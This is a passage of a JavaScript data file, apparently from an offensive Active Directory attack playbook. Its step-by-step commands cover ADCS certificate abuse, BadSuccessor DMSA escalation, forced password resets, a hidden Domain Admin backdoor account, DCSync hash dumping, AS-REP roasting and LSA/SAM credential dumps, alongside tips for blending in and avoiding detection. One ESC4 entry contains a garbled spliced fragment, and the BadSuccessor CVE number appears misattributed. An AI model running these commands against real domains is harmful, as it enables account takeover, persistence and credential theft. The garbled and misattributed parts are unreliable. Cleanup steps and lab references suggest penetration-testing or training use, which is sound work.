  {n:1,t:'Check if wildcard already exists',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get dnsDump | grep -B2 -A5 \'domain: \\*\'',note:'If a wildcard exists, someone else or a defensive measure is there. Spoofing won\'t work.'},
  {n:2,t:'Add wildcard DNS record',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add dnsRecord \'*\' <HOST>',note:'Replace <HOST> with your attacker IP. All unresolved hostnames in this domain will now resolve to your machine.'},
  {n:3,t:'Verify the wildcard was created',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get dnsDump | grep -A5 \'domain: \\*\'',note:'Should show: domain: *.domain.com | A: <your_IP>'},
  {n:4,t:'Capture hashes or relay (same as ADIDNS spoofing)',cmd:'responder -I eth0 -A  # Analysis mode first to see traffic',note:'Start in analysis mode first to see what\'s coming in, then switch to active mode.'},
  {n:5,t:'🧹 CLEANUP: Remove wildcard record',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove dnsRecord \'*\' <HOST>',note:'Wildcards can be disruptive — remove immediately after capturing credentials.',cleanup:true}
 ],
 opsec:['Wildcard DNS can disrupt legitimate operations — clients may fail to connect to non-existent services','High traffic volume if many clients — easy to detect via DNS query logs','Consider time-limited deployment']},

// ── ADCS ATTACKS ─────────────────────────────────────────
{id:'esc1',cat:'adcs',icon:'📜',name:'ADCS ESC1 — SAN Template Abuse',impact:'critical',noise:'medium',
 prereq:'Write access to certificate template (GenericAll/WriteDACL); or enrollment rights on an already vulnerable template',
 desc:'<strong>What:</strong> Enable ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME on a certificate template, then enroll requesting a SAN (Subject Alternative Name) of "Administrator@domain.com". The issued certificate can authenticate as any user — including DA.<br><br><strong>Why it works:</strong> When ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME is set, the enrollee controls the SAN — they can claim to be ANY user. Combined with PKINIT, this cert becomes a full authentication credential for the DA account.',
 steps:[
  {n:1,t:'Find certificate templates and check current state',cmd:'certipy find -u \'<USER>@<DOMAIN>\' -p \'<PASS>\' -dc-ip <HOST> -vulnerable -stdout',note:'Best tool for ADCS enumeration — shows ESC1-ESC13 classified vulnerabilities. Raw template list: bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search --filter \'(objectClass=pKICertificateTemplate)\' --attr cn,msPKI-Certificate-Name-Flag'},
  {n:2,t:'Enable ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME on template',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set object \'CN=TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=com\' msPKI-Certificate-Name-Flag -v 1',note:'Sets msPKI-Certificate-Name-Flag=1 (ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME). Requires write access to the template object. Use full DN path. Modify msPKI-Certificate-Name-Flag to enable the SAN flag. Requires write access to the template.'},
  {n:3,t:'Check enrollment services (CA names)',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search --filter \'(objectClass=pKIEnrollmentService)\' --attr cn,dNSHostName',note:'Lists CA names needed for certipy. cn = CA Name (-ca flag), dNSHostName = CA Server (-target flag). Format: CA-Name at CA-Server.'},
  {n:4,t:'Request cert with Administrator SAN via certipy',cmd:'certipy req -u \'<USER>@<DOMAIN>\' -p \'<PASS>\' -dc-ip <HOST> -target <CA_SERVER> -ca \'<CA_NAME>\' -template \'TemplateName\' -upn \'Administrator@<DOMAIN>\'',note:'certipy requests a cert with Administrator\'s UPN as the SAN. Saves as administrator.pfx.'},
  {n:5,t:'Authenticate as Administrator using the cert',cmd:'certipy auth -pfx administrator.pfx -dc-ip <HOST>',note:'certipy does PKINIT auth and extracts the NT hash. Outputs: Administrator:NTHASH'},
  {n:6,t:'Use NT hash for DA access',cmd:'evil-winrm -i <HOST> -u Administrator -H <NTHASH>',note:'Full domain admin access via pass-the-hash.'},
  {n:7,t:'🧹 CLEANUP: Remove SAN flag from template',cmd:'certipy template -u \'<USER>@<DOMAIN>\' -p \'<PASS>\' -dc-ip <HOST> -template \'TemplateName\' -save-old',note:'Use certipy or bloodyAD to restore original msPKI-Certificate-Name-Flag value.',cleanup:true}
 ],
 opsec:['Certificate requests generate Event ID 4886/4887 on the CA','SAN modification on templates is logged (Event ID 4899 on CA)','Issued cert valid until expiry — revoke after engagement']},

{id:'esc4',cat:'adcs',icon:'📋',name:'ADCS ESC4 — Enrollment Rights Grant',impact:'high',noise:'medium',
 prereq:'Write access to a certificate template (GenericAll/WriteDACL/WriteOwner)',
 desc:'<strong>What:</strong> Grant yourself enrollment rights on a certificate template that has dangerous settings (e.g., allows SAN, Manager Approval disabled). Then enroll to escalate.<br><br><strong>Why it works:</strong> Certificate enrollment rights (Certificate-Enrollment extended right) control who can request certs from a template. Adding yourself bypasses enrollment restrictions.',
 steps:[
  {n:1,t:'Check templates with write access',cmd:'certipy find -u \'<USER>@<DOMAIN>\' -p \'<PASS>\' -dc-ip <HOST> -vulnerable -stdout',note:'Find templates where you have GenericAll, WriteDACL, or WriteProperty. Also check: certipy find -vulnerable for ready-made ESC detection.'},
  {n:2,t:'Get your user DN',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get object <USER> --attr distinguishedName',note:'Returns your full DN — needed for the genericAll command in the next step.'},
  {n:3,t:'Grant yourself enrollment rights on the template',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add genericAll \'CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=com\' <USER>',note:'Grants your account GenericAll on the template (includes enrollment rights). Use full template DN. Find template name from certipy output. After this, enroll with certipy req.MAIN>,DC=com\'',note:'Adds Certificate-Enrollment ACE for your account on the template.'},
  {n:4,t:'Now enroll in the template (follow ESC1 steps if SAN-enabled)',cmd:'certipy req -u \'<USER>@<DOMAIN>\' -p \'<PASS>\' -dc-ip <HOST> -target <CA_SERVER> -ca \'<CA_NAME>\' -template \'VulnerableTemplate\'',note:'If template also has ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME, add -upn Administrator@<DOMAIN> for ESC1 combo.'}
 ],
 opsec:['Template ACL modification generates Event ID 4899 on CA','Less noisy than modifying template flags directly']},

// ── ADVANCED ATTACKS ─────────────────────────────────────
{id:'badsuccessor',cat:'new',icon:'💥',name:'BadSuccessor — DMSA Privilege Assumption',impact:'critical',noise:'high',
 prereq:'CreateChild right on any OU in the domain (or use --ou to specify writable OU); domain must support DMSA (Windows Server 2025)',
 desc:'<strong>What:</strong> Creates a Dedicated Managed Service Account (DMSA) configured to "succeed" a target privileged account. When the DMSA\'s next login occurs, it assumes ALL the managed privileges of the target account — including DA rights if targeting Administrator.<br><br><strong>Why it works:</strong> DMSAs are a new AD object type (Server 2025) for managed service principal migration. The msDS-ManagedAccountPrecededByLink and msDS-DelegatedMSAState attributes control which account a DMSA "supersedes". This is tracked as CVE-2025-33073.',
 steps:[
  {n:1,t:'Check if BadSuccessor is applicable',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get object \'\'  --attr domainControllerFunctionality,domainFunctionality',note:'Check DC functional level. Must be 10 (Server 2025) to support DMSA. domainControllerFunctionality support DMSA. Requires Server 2025 DC.'},
  {n:2,t:'Find writable OUs (where you can create child objects)',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get writable --otype OU --right CHILD',note:'Lists OUs where you have CreateChild rights. The DMSA object will be created here.'},
  {n:3,t:'Create DMSA targeting the Administrator account',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add badSuccessor evilDMSA -t \'CN=Administrator,CN=Users,DC=<DOMAIN>,DC=com\' --ou \'OU=Computers,DC=<DOMAIN>,DC=com\'',note:'Creates a DMSA named evilDMSA$ that will assume Administrator\'s privileges. If --ou omitted, picks first writable OU automatically.'},
  {n:4,t:'Read the DMSA\'s managed password',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get object \'evilDMSA$\' --attr msDS-ManagedPassword',note:'The DMSA\'s password is auto-managed like a gMSA. Read it to get the NT hash.'},
  {n:5,t:'Use the DMSA account (which has Administrator privileges)',cmd:'evil-winrm -i <HOST> -u \'evilDMSA$\' -H <NTHASH>',note:'Authenticate as the DMSA — it has inherited Administrator\'s privileges.'},
  {n:6,t:'🧹 CLEANUP: Delete the DMSA object',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove object \'evilDMSA$\'',note:'Delete the rogue DMSA account.',cleanup:true}
 ],
 opsec:['⚠️ NEW ATTACK (2025) — limited SIEM rules exist but expect rapid detector development','DMSA creation generates AD object creation events','High impact, high noise — use as last resort or in environments without mature SIEM']},

{id:'forcepasswd',cat:'privesc',icon:'🔑',name:'Force Password Reset',impact:'high',noise:'medium',
 prereq:'ForceChangePassword right on target user (User-Force-Change-Password ACE), or GenericAll/WriteProperty on unicodePwd',
 desc:'<strong>What:</strong> Reset a target user\'s password to a value you control WITHOUT knowing their current password. Instantly gives you access to their account and all resources they have access to.<br><br><strong>Why it works:</strong> The User-Force-Change-Password extended right bypasses the old password requirement. GenericAll includes WRITE_PROP on unicodePwd which similarly allows forced password changes.',
 steps:[
  {n:1,t:'Verify you have ForceChangePassword right',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get object <TARGET> --resolve-sd',note:'Look for: Right: CONTROL_ACCESS | ObjectType: User-Force-Change-Password. Or: WRITE_PROP on unicodePwd.'},
  {n:2,t:'Force-reset target\'s password',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set password <TARGET> \'Hacked123!\'',note:'No --oldpass needed when you have ForceChangePassword. Immediately effective.'},
  {n:3,t:'Verify authentication with new password',cmd:'nxc smb <HOST> -d <DOMAIN> -u <TARGET> -p \'Hacked123!\'',note:'Confirm the password change worked. Green [+] = success.'},
  {n:4,t:'Enumerate target\'s access',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <TARGET> -p \'Hacked123!\' get writable',note:'Now enumerate what the target account can access to plan next steps.'},
  {n:5,t:'🧹 CLEANUP — SET A KNOWN SAFE PASSWORD',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set password <TARGET> \'RestorePass456!\'',note:'⚠️ CRITICAL: Agree with client on what to reset to. If the account has a real user, coordinate! Locking them out is a compliance issue.',cleanup:true}
 ],
 opsec:['Event ID 4723 (user changed own pw) or 4724 (admin changed pw) generated','Target user will notice they can\'t log in with old password — highly disruptive','Prefer shadow credentials or group membership if stealth is required']},

{id:'restore',cat:'privesc',icon:'♻️',name:'Restore Deleted AD Object',impact:'medium',noise:'low',
 prereq:'Write access + the deleted object must still be in the Deleted Objects container (within tombstone lifetime, usually 180 days)',
 desc:'<strong>What:</strong> Restore a deleted AD object (user, computer, group) back to a live state. Useful when a privileged account was deleted but its SID/permissions still exist in ACLs.<br><br><strong>Why it works:</strong> Deleted AD objects are moved to the Deleted Objects container and tombstoned — they remain for 180 days. Restoration re-activates the account with the original SID, instantly inheriting all ACL permissions from before deletion.',
 steps:[
  {n:1,t:'Search for deleted objects',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search -c 1.2.840.113556.1.4.2064 --filter \'(isDeleted=TRUE)\' --attr sAMAccountName,whenChanged',note:'The control OID enables searching tombstoned objects. Returns all deleted objects with their names and deletion dates.'},
  {n:2,t:'Find a specific deleted privileged account',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search -c 1.2.840.113556.1.4.2064 --filter \'(&(isDeleted=TRUE)(sAMAccountName=<TARGET>))\' --attr distinguishedName',note:'Get the full DN of the deleted object — needed for restore command.'},
  {n:3,t:'Restore the deleted object',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set restore <DELETED_DN> --newName <NEWNAME> --newParent \'CN=Users,DC=<DOMAIN>,DC=com\'',note:'<DELETED_DN> = the DN from step 2 (will look like: CN=name\\0ADEL:GUID,CN=Deleted Objects,...). --newName sets the sAMAccountName.'},
  {n:4,t:'Set a password on the restored account',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set password <NEWNAME> \'NewPass123!\'',note:'Restored accounts have no valid password. Set one to activate.'},
  {n:5,t:'Enable the account (if disabled)',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove uac <NEWNAME> -f ACCOUNTDISABLE',note:'Clears the ACCOUNTDISABLE flag to enable the restored account. Deleted objects may restore as disabled. Enable to authenticate.'}
 ],
 opsec:['Object restoration generates Event ID 4742 or 4738','Restoring a previously deleted privileged account may trigger alerts if the original deletion was security-motivated']},

{id:'backdoor-user',cat:'privesc',icon:'🚪',name:'Create Backdoor User Account',impact:'high',noise:'medium',
 prereq:'CreateChild right on CN=Users or target OU (ms-DS-MachineAccountQuota > 0 for computers)',
 desc:'<strong>What:</strong> Create a new domain user account that you control. Add it to privileged groups for persistent access. Useful as a persistence mechanism or when you need a clean account without affecting existing accounts.<br><br><strong>Why it works:</strong> Any domain user can create accounts in containers they have CreateChild on. Domain users often have this in the default Users container.',
 steps:[
  {n:1,t:'Create a backdoor user account',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add user backdoor \'BackdoorPass123!\' --ou \'CN=Users,DC=<DOMAIN>,DC=com\'',note:'Creates a user named "backdoor" with the specified password. Choose a name that blends in.'},
  {n:2,t:'Add backdoor user to Domain Admins',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add groupMember \'Domain Admins\' backdoor',note:'Requires GenericAll or WriteProperty on member attribute of Domain Admins.'},
  {n:3,t:'Verify the account works',cmd:'nxc smb <HOST> -d <DOMAIN> -u backdoor -p \'BackdoorPass123!\'',note:'Test authentication.'},
  {n:4,t:'Set account to not expire password',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add uac backdoor -f DONT_EXPIRE_PASSWORD',note:'Prevent the password from expiring so your backdoor persists.'},
  {n:5,t:'🧹 CLEANUP: Remove account',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove object backdoor',note:'Delete the backdoor account at the end of the engagement.',cleanup:true}
 ],
 opsec:['New account creation generates Event ID 4720','DA group add generates Event ID 4728','Choose a name matching existing naming conventions (firstname.lastname format)','Set the account description to something normal-looking']},

// ── CRITICAL LESSON: GenericAll on GROUP ──────────────────────
{id:'genericall_group',cat:'privesc',icon:'👥',name:'GenericAll on GROUP → Nested Rights Exploitation',impact:'critical',noise:'medium',
 prereq:'GenericAll or WriteDACL on a GROUP object (not on the domain directly); the group must have rights on another valuable object',
 desc:'<strong>⚠️ KEY LESSON:</strong> GenericAll on a <em>group</em> means you control the <strong>group itself</strong> — add/remove members, change properties. It does <strong>NOT</strong> give you the group\'s rights on other objects automatically.<br><br>To exploit the group\'s ACEs on other objects: (1) add yourself to the group, (2) then use <code>dacledit.py</code> which creates a fresh LDAP session respecting your new group membership.<br><br><strong>Real Example (HTB Forest):</strong> svc-alfresco has GenericAll on "EXCHANGE WINDOWS PERMISSIONS". That group has WriteDACL on HTB.LOCAL. Chain: GenericAll on group → add self to group → dacledit.py grants DCSync → secretsdump.',
 steps:[
  {n:1,t:'Verify: what rights does the GROUP have on OTHER objects',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get object \'<TARGET>\' --resolve-sd',note:'<TARGET> = the group you have GenericAll on. Check BloodHound for outbound edges from the group.'},
  {n:2,t:'Add yourself to the group (exploit your GenericAll on it)',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add groupMember \'<TARGET>\' <USER>',note:'<TARGET> = group you control. You are now a member — but your Kerberos TGT does NOT reflect this yet.'},
  {n:3,t:'[IF group has WriteDACL on DOMAIN] Use dacledit.py — NOT bloodyAD add dcsync',cmd:'dacledit.py -action write -rights DCSync -principal <USER> -target-dn \'<DN>\' \'<DOMAIN>/<USER>:<PASS>\'',note:'dacledit.py uses password auth (new LDAP session) — server evaluates group membership server-side. bloodyAD add dcsync fails because it checks your existing Kerberos token which lacks the new group.'},
  {n:4,t:'DCSync all hashes',cmd:'impacket-secretsdump \'<DOMAIN>/<USER>:<PASS>\'@<HOST> -just-dc-ntlm',note:'Dumps all NT hashes. Get Administrator hash for PTH.'},
  {n:5,t:'[IF group has GenericAll on a USER] Reset that user\'s password',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set password <TRUSTEE> \'<NEWPASS>\'',note:'Being in a group that has GenericAll on a user gives you that user control once you join the group.'},
  {n:6,t:'🧹 CLEANUP: Remove DCSync rights',cmd:'dacledit.py -action remove -rights DCSync -principal <USER> -target-dn \'<DN>\' \'<DOMAIN>/<USER>:<PASS>\'',note:'Remove the DCSync ACE.',cleanup:true},
  {n:7,t:'🧹 CLEANUP: Leave the group',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove groupMember \'<TARGET>\' <USER>',note:'Remove yourself from the group.',cleanup:true}
 ],
 opsec:['GenericAll on group ≠ domain control — you only control the group object itself','Event ID 4728 on group join','dacledit.py generates Event ID 4670 on DACL modify','CRITICAL: Kerberos TGT does NOT refresh automatically — dacledit.py with password bypasses this by using password-based LDAP auth']},

// ── WRITEDACL VIA GROUP MEMBERSHIP (Forest Fix) ───────────────
{id:'writedacl_via_group',cat:'privesc',icon:'🔑',name:'WriteDACL on Domain via Group Membership — Forest Fix',impact:'critical',noise:'medium',
 prereq:'Member of a group with WriteDACL on the domain root, OR ability to add yourself to such a group',
 desc:'<strong>This is the exact HTB Forest scenario.</strong> "EXCHANGE WINDOWS PERMISSIONS" has WriteDACL on the domain. You have GenericAll on that group → add yourself → use dacledit.py to grant DCSync.<br><br><strong>Why bloodyAD add dcsync fails:</strong> It checks if YOUR USER has WriteDACL directly — it does not. The GROUP does. Your Kerberos TGT also doesn\'t reflect the new group membership.<br><br><strong>Why dacledit.py works:</strong> Password auth creates a FRESH LDAP session. The AD server evaluates your permissions including newly-joined group membership → sees WriteDACL → allows DACL write.',
 steps:[
  {n:1,t:'Add yourself to the group that has WriteDACL on domain',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add groupMember \'EXCHANGE WINDOWS PERMISSIONS\' <USER>',note:'Replace group name as appropriate. After this, AD server grants WriteDACL via group, but your TGT does not know yet.'},
  {n:2,t:'Grant DCSync with dacledit.py (password auth = fresh session)',cmd:'dacledit.py -action write -rights DCSync -principal <USER> -target-dn \'<DN>\' \'<DOMAIN>/<USER>:<PASS>\'',note:'⚠️ DO NOT USE: bloodyAD add dcsync — WILL FAIL with INSUFF_ACCESS_RIGHTS\ndacledit.py creates a new LDAP connection using your password. Server sees your group membership and allows the DACL write.'},
  {n:3,t:'DCSync dump',cmd:'secretsdump.py \'<DOMAIN>/<USER>:<PASS>\'@<HOST> -just-dc-ntlm',note:'Dumps all NTLM hashes. Administrator and krbtgt are key targets.'},
  {n:4,t:'Pass-the-Hash as Administrator',cmd:'evil-winrm -i <HOST> -u Administrator -H <NTHASH>',note:'Use Administrator NT hash from secretsdump output.'},
  {n:5,t:'🧹 CLEANUP: Remove DCSync rights',cmd:'dacledit.py -action remove -rights DCSync -principal <USER> -target-dn \'<DN>\' \'<DOMAIN>/<USER>:<PASS>\'',note:'Remove DCSync ACE.',cleanup:true},
  {n:6,t:'🧹 CLEANUP: Leave the group',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove groupMember \'EXCHANGE WINDOWS PERMISSIONS\' <USER>',note:'Remove from group.',cleanup:true}
 ],
 opsec:['Event ID 4728 on group join','Event ID 4670 on DACL modify','Event ID 4662 on DCSync replication','Minimize time between group join and DCSync — smaller exposure window']},

// ── OWNS CHAIN ────────────────────────────────────────────────
{id:'owns_chain',cat:'privesc',icon:'👑',name:'Owns → WriteDACL → GenericAll Chain',impact:'critical',noise:'medium',
 prereq:'Owns edge on target object (you are the owner) OR WriteOwner right to claim ownership',
 desc:'<strong>What:</strong> AD object owners always have implicit WriteDACL — even if the DACL explicitly denies them. As owner, grant yourself GenericAll, then take full control.<br><br><strong>Why it works:</strong> The Security Descriptor stores the owner SID. Windows always grants WRITE_DACL to the owner field regardless of DACL content.',
 steps:[
  {n:1,t:'Verify ownership or WriteOwner',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get object <TARGET> --resolve-sd',note:'Look for "Owner:" field showing your account. Or Owns/WriteOwner edge in BloodHound.'},
  {n:2,t:'[If WriteOwner] Take ownership first',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set owner <TARGET> <USER>',note:'Claims ownership. Now you implicitly have WriteDACL. Skip if already owner.'},
  {n:3,t:'Grant yourself GenericAll (owner has implicit WriteDACL)',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add genericAll <TARGET> <USER>',note:'No separate WriteDACL step — ownership implies it. Adds GenericAll ACE for your account.'},
  {n:4,t:'Exploit GenericAll on USER: reset password',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set password <TARGET> \'<NEWPASS>\'',note:'Full control. Pick best exploitation method for target type.'},
  {n:5,t:'Exploit GenericAll on GROUP: add member',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add groupMember <TARGET> <USER>',note:'If target is privileged group, add yourself.'},
  {n:6,t:'Exploit GenericAll on COMPUTER: shadow credentials',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add shadowCredentials <TARGET> --path /tmp/<TARGET>_shadow',note:'Certificate-based backdoor — stealthier than password reset.'},
  {n:7,t:'🧹 CLEANUP: Remove GenericAll ACE',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove genericAll <TARGET> <USER>',note:'Restore original DACL.',cleanup:true}
 ],
 opsec:['Owner change = Event ID 4780 (if audited)','DACL modification = Event ID 4670','With WRITE_OWNER only: can only set YOURSELF as owner — not others']},

// ── ALLEXTENDEDRIGHTS ─────────────────────────────────────────
{id:'allextendedrights',cat:'privesc',icon:'🔓',name:'AllExtendedRights Abuse',impact:'high',noise:'medium',
 prereq:'AllExtendedRights (CONTROL_ACCESS with no ObjectType restriction) on user, computer, or domain object',
 desc:'<strong>What:</strong> AllExtendedRights grants ALL extended rights on an object. On a <strong>user</strong>: ForceChangePassword. On a <strong>computer</strong>: ReadLAPSPassword. On the <strong>domain</strong>: DCSync.<br><br><strong>vs GenericAll:</strong> AllExtendedRights covers extended rights only — not regular attribute writes. Cannot set SPNs or scriptPath, but can force password resets and DCSync.',
 steps:[
  {n:1,t:'Check target type and rights',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get object <TARGET> --resolve-sd',note:'Look for CONTROL_ACCESS without specific ObjectType = AllExtendedRights.'},
  {n:2,t:'[Target is USER] Force password change',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set password <TARGET> \'<NEWPASS>\'',note:'AllExtendedRights on user includes User-Force-Change-Password. No old password needed.'},
  {n:3,t:'[Target is USER] Alternative: rpcclient',cmd:'rpcclient -U \'<DOMAIN>\\\\<USER>%<PASS>\' <HOST> -c \'setuserinfo2 <TARGET> 23 <NEWPASS>\'',note:'setuserinfo2 level 23 = set password. Use if bloodyAD fails.'},
  {n:4,t:'[Target is DOMAIN] Grant DCSync',cmd:'dacledit.py -action write -rights DCSync -principal <USER> -target-dn \'<DN>\' \'<DOMAIN>/<USER>:<PASS>\'',note:'AllExtendedRights on domain includes replication rights. Use dacledit for the actual grant.'},
  {n:5,t:'[Target is COMPUTER] Read LAPS password',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get object <TARGET> --attr ms-Mcs-AdmPwd',note:'AllExtendedRights on computer includes ms-Mcs-AdmPwd read.'},
  {n:6,t:'Verify and authenticate with new creds',cmd:'nxc smb <HOST> -d <DOMAIN> -u <TARGET> -p \'<NEWPASS>\'',note:'Confirm password change.'},
  {n:7,t:'🧹 CLEANUP if password was reset',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set password <TARGET> \'<OLDPASS>\'',note:'Restore original password if known.',cleanup:true}
 ],
 opsec:['Event ID 4724 on password reset','Event ID 4662 on extended right use (if audited)']},

// ── ADDSELF ───────────────────────────────────────────────────
{id:'addself',cat:'privesc',icon:'🙋',name:'AddSelf → Self-Addition to Privileged Group',impact:'high',noise:'medium',
 prereq:'Self-Membership extended right (AddSelf ACE) on target group',
 desc:'<strong>What:</strong> AddSelf lets you add YOUR OWN account to a group — but not others. If the target group is Domain Admins or other privileged group, the effect is identical to AddMember.',
 steps:[
  {n:1,t:'Verify Self-Membership right on group',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get object <TARGET> --resolve-sd',note:'Look for Right: SELF | ObjectType: Self-Membership.'},
  {n:2,t:'Add yourself to the group',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add groupMember <TARGET> <USER>',note:'<USER> = YOUR account only. Cannot add other accounts with AddSelf.'},
  {n:3,t:'Get new TGT to reflect group membership',cmd:'getTGT.py \'<DOMAIN>/<USER>:<PASS>\' -dc-ip <HOST> && export KRB5CCNAME=<USER>.ccache',note:'Existing TGT does not include new group. Fresh TGT needed for Kerberos-based tools.'},
  {n:4,t:'Exploit new group membership',cmd:'evil-winrm -i <HOST> -u <USER> -p \'<PASS>\'',note:'Re-authenticate to get updated group token.'},
  {n:5,t:'🧹 CLEANUP: Remove yourself',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove groupMember <TARGET> <USER>',note:'Remove yourself from the group.',cleanup:true}
 ],
 opsec:['Event ID 4728/4732/4756 on group membership change','Same detection signature as full AddMember']},

// ── WRITEACCOUNTRESTRICTIONS ──────────────────────────────────
{id:'writeaccountrestrictions',cat:'cred',icon:'🎯',name:'WriteAccountRestrictions → AS-REP Roasting Setup',impact:'medium',noise:'low',
 prereq:'WriteProperty on Account-Restrictions property set OR GenericWrite/GenericAll on target user',
 desc:'<strong>What:</strong> WriteAccountRestrictions allows modifying userAccountControl — set DONT_REQ_PREAUTH for AS-REP roasting.<br><br><strong>Faster than the generic AS-REP attack:</strong> Specifically targets accounts with weak passwords that you want to crack. Set flag → get hash → remove flag immediately.',
 steps:[
  {n:1,t:'Verify write access to UAC on target',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get writable --otype USER --right WRITE --detail',note:'Look for write to userAccountControl or Account-Restrictions property set on target user.'},
  {n:2,t:'Set DONT_REQ_PREAUTH flag',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add uac <TARGET> -f DONT_REQ_PREAUTH',note:'Disables Kerberos pre-auth. Anyone can now request an AS-REP for this user.'},
  {n:3,t:'Immediately request AS-REP hash',cmd:'GetNPUsers.py <DOMAIN>/<TARGET> -no-pass -dc-ip <HOST>',note:'Returns $krb5asrep$23$... hash for offline cracking.'},
  {n:4,t:'Crack offline',cmd:'hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force -r /usr/share/hashcat/rules/best64.rule',note:'Mode 18200 for AS-REP RC4.'},
  {n:5,t:'IMMEDIATELY restore the flag',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove uac <TARGET> -f DONT_REQ_PREAUTH',note:'Time-sensitive: set → get hash → remove immediately.',cleanup:true}
 ],
 opsec:['UAC change = Event ID 4738','AS-REP request = Event ID 4768 with no pre-auth type','Minimize flag exposure window']},

// ── ADMINTO ───────────────────────────────────────────────────
{id:'adminto',cat:'exec',icon:'💻',name:'AdminTo → Local Admin Abuse',impact:'critical',noise:'high',
 prereq:'Local Administrator access on target machine (AdminTo edge in BloodHound)',
 desc:'<strong>What:</strong> Local admin = full system control. Dump credentials from SAM (local hashes), LSA (service account passwords in plaintext), and LSASS (cached domain creds). Look for service accounts with domain rights.',
 steps:[
  {n:1,t:'Verify local admin access',cmd:'nxc smb <TARGET_IP> -u <USER> -p \'<PASS>\' -d <DOMAIN>',note:'"Pwn3d!" in output = local admin confirmed.'},
  {n:2,t:'Dump LSA secrets (often plaintext service account passwords)',cmd:'secretsdump.py \'<DOMAIN>/<USER>:<PASS>\'@<TARGET_IP> -lsa',note:'⭐ Best credential source. Look for _SC_ entries = service account passwords in plaintext.'},
  {n:3,t:'Dump SAM hashes (local accounts)',cmd:'secretsdump.py \'<DOMAIN>/<USER>:<PASS>\'@<TARGET_IP> -sam',note:'Local Administrator hash. Reuse on other machines with same local admin password.'},
  {n:4,t:'Full dump',cmd:'secretsdump.py \'<DOMAIN>/<USER>:<PASS>\'@<TARGET_IP>',note:'SAM + LSA + NTDS (if DC). Everything at once.'},
